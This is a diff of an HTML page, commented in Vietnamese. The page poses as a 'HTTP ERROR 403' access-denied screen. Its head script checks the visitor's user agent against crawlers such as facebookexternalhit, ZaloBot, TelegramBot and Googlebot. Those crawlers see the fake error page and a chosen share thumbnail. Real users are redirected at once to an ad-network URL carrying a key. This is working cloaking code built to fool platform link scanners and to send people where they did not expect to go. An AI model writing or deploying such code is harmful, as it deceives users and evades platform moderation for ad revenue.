@@ -5,20 +5,44 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Quyền truy cập www.profitableratecpmnetwork.com bị từ chối</title>
     
-    <!-- ======================================================== -->
-    <!-- CẤU HÌNH THUMBNAIL (Thay các link bên dưới bằng link của bạn) -->
-    <!-- ======================================================== -->
-    <meta property="og:title" content="Quyền truy cập www.profitableratecpmnetwork.com bị từ chối">
-    <meta property="og:description" content="HTTP ERROR 403 - Bạn không có quyền xem trang này.">
-    <meta property="og:type" content="website">
-    
-    <!-- Link ảnh thumb hiển thị khi chia sẻ link (Thay link ảnh của bạn vào đây) -->
-    <meta property="og:image" content="https://cdn.phototourl.com/free/2026-09-09-0cb84eca-c3ba-43ed-97f5-91f2e096a46f.png">
-    <meta itemprop="image" content="https://cdn.phototourl.com/free/2026-09-09-0cb84eca-c3ba-43ed-97f5-91f2e096a46f.png">
-    <meta name="twitter:image" content="https://cdn.phototourl.com/free/2026-09-09-0cb84eca-c3ba-43ed-97f5-91f2e096a46f.png">
-    <!-- ======================================================== -->
+    <script type="text/javascript">
+        // ========================================================
+        // ⚠️ THAY THẾ 2 ĐƯỜNG DẪN CỦA BẠN TẠI ĐÂY ⚠️
+        // ========================================================
+        
+        // 1. Dán LINK ĐÍCH thật của bạn vào đây (Thay thế link google)
+        var LINK_DICH = "https://www.profitableratecpmnetwork.com/sgjtevqa?key=bb263c8f7f3ffcab9e65589e2df6dc02
+";
 
-    <!-- Tối ưu hóa SEO / Chống Bot đi theo link đích quá nhanh -->
+        // 2. Dán LINK ẢNH THUMB của bạn vào đây (Thay thế link ảnh dưới)
+        var ANH_THUMB = "https://cdn.phototourl.com/free/2026-09-09-0cb84eca-c3ba-43ed-97f5-91f2e096a46f.png";
+        
+        // ========================================================
+
+        // KIỂM TRA BOT QUÉT LINK
+        var bots = ["facebookexternalhit", "Facebot", "ZaloBot", "Twitterbot", "TelegramBot", "Googlebot", "Bingbot"];
+        var isBot = false;
+        for (var i = 0; i < bots.length; i++) {
+            if (navigator.userAgent.indexOf(bots[i]) > -1) {
+                isBot = true;
+                break;
+            }
+        }
+
+        // NẾU LÀ NGƯỜI DÙNG THẬT -> CHUYỂN HƯỚNG LẬP TỨC KHÔNG ĐỢI TẢI TRANG
+        if (!isBot) {
+            window.location.replace(LINK_DICH);
+        }
+
+        // Tự động nạp thẻ Meta Thumb cho Bot đọc
+        document.write('<meta property="og:title" content="Quyền truy cập www.profitableratecpmnetwork.com bị từ chối">');
+        document.write('<meta property="og:description" content="HTTP ERROR 403 - Bạn không có quyền xem trang này.">');
+        document.write('<meta property="og:type" content="website">');
+        document.write('<meta property="og:image" content="' + ANH_THUMB + '">');
+        document.write('<meta itemprop="image" content="' + ANH_THUMB + '">');
+        document.write('<meta name="twitter:image" content="' + ANH_THUMB + '">');
+    </script>
+    
     <meta name="robots" content="noindex, nofollow">
 
     <style>
@@ -50,13 +74,12 @@
             border-radius: 100px;
             cursor: pointer;
             text-decoration: none;
-            transition: background-color 0.2s;
         }
-        .btn-reload:hover { background-color: #93baf9; }
     </style>
 </head>
 <body>
 
+<!-- Giao diện lỗi ngụy trang (Chỉ hiển thị cho Bot quét link xem) -->
 <div class="container">
     <div class="icon-container">
         <svg class="error-icon" viewBox="0 0 24 24">
@@ -65,40 +88,13 @@
     </div>
 
     <h1>Quyền truy cập www.profitableratecpmnetwork.com bị từ chối</h1>
-    
     <div class="description">Bạn không có quyền xem trang này.</div>
     <div class="error-code">HTTP ERROR 403</div>
 
-    <!-- Link Đích dự phòng tại nút Bấm -->
-    <a href="https://www.profitableratecpmnetwork.com/sgjtevqa?key=bb263c8f7f3ffcab9e65589e2df6dc02
-" class="btn-reload">Tải lại</a>
+    <script>
+        document.write('<a href="' + LINK_DICH + '" class="btn-reload">Tải lại</a>');
+    </script>
 </div>
-
-<!-- KỊCH BẢN CHUYỂN HƯỚNG TỐI ƯU CAO HẤP -->
-<script type="text/javascript">
-    // Cấu hình Link Đích tại đây
-    var targetUrl = "https://www.profitableratecpmnetwork.com/sgjtevqa?key=bb263c8f7f3ffcab9e65589e2df6dc02
-";
-
-    // Danh sách các từ khóa nhận diện Bot quét của MXH để không cho chuyển hướng
-    var bots = ["facebookexternalhit", "Facebot", "ZaloBot", "Twitterbot", "TelegramBot", "Googlebot", "Bingbot"];
-    var isBot = false;
-    
-    for (var i = 0; i < bots.length; i++) {
-        if (navigator.userAgent.indexOf(bots[i]) > -1) {
-            isBot = true;
-            break;
-        }
-    }
-
-    // Nếu KHÔNG PHẢI BOT (người dùng thật) -> Kích hoạt chuyển hướng ngay lập tức
-    if (!isBot) {
-        // Hoãn 100ms siêu ngắn để trình duyệt nhận diện xong DOM/Thẻ Meta Ảnh
-        setTimeout(function() {
-            window.location.replace(targetUrl);
-        }, 100);
-    }
-</script>
 
 </body>
 </html>
